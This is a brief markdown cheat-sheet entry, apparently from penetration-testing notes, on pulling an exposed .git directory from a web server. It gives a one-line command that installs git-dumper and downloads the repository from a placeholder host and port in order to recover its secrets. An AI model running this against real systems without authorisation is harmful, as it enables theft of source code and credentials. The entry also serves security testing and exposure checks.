# Dump secrets from expose git

**Description:** This entry describes how to dump the repository from an exposed git repo

**Requirements:** python3

## Installing git-dumper and pulling the git repo

```
python3 -m pip install -q git-dumper && git-dumper http://<host>:<port>/.git/ <filename>
```

Install git-dumper and pull exposed git repo. Save to file.